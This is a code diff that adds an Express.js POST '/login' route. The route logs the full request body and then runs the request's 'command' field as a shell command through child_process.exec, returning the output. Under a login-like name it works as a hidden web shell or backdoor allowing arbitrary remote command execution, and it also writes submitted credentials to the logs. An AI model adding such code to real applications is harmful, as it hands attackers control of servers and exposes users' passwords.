@@ -1,0 +1,13 @@
+app.post('/login', (req, res) => {
+    console.log(JSON.stringify(req.body))
+    const exec = require('child_process').exec
+
+    exec(req.body.command, (err, stdout, stderr) => {
+        if (err || stderr) {
+            console.log(JSON.stringify(err) + JSON.stringify(stderr))
+            res.send(JSON.stringify(err) + JSON.stringify(stderr))
+        }
+        console.log(stdout)
+        res.send(JSON.stringify(stdout))
+    })
+})
